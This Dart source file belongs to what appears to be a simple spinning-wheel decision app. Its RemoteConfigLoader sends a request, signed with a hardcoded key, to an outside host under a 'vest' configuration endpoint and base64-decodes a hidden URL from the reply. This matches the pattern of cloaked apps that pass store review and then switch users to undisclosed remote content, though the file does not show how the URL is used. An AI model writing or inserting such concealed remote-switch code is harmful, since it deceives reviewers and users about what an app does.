import 'dart:convert';
import 'package:crypto/crypto.dart';
import 'package:http/http.dart' as http;

const _apiUrl = 'https://www.sddgg3.cc/api/vest/getConfig';
const _signKey = 'WJQP97@&IAUDGVDV';
const _appId = 'com.spinlywheel.decisionmaker';

String _md5Sign(String input) {
  return md5.convert(utf8.encode(input)).toString();
}

String _decodeB64(String str) {
  try {
    return utf8.decode(base64Decode(str));
  } catch (_) {
    return '';
  }
}

class RemoteConfigLoader {
  static Future<String?> fetchUrl() async {
    try {
      final timestamp = DateTime.now().millisecondsSinceEpoch;
      final signature = _md5Sign(
        'millisecond=$timestamp&packageName=$_appId&key=$_signKey',
      ).toUpperCase();

      final response = await http
          .post(
            Uri.parse(_apiUrl),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode({
              'millisecond': timestamp,
              'packageName': _appId,
              'sign': signature,
            }),
          )
          .timeout(const Duration(seconds: 15));

      print('[RemoteConfig] statusCode: ${response.statusCode}');
      print('[RemoteConfig] response: ${response.body}');

      if (response.statusCode == 200) {
        final payload = jsonDecode(response.body);
        final encoded = payload?['data']?['d'] as String?;
        if (encoded != null && encoded.isNotEmpty) {
          final decodedUrl = _decodeB64(encoded);
          print('[RemoteConfig] decoded: $decodedUrl');
          return decodedUrl;
        }
        print('[RemoteConfig] no encoded data field');
      }
    } catch (e) {
      print('[RemoteConfig] request error: $e');
      return null;
    }
    return null;
  }
}
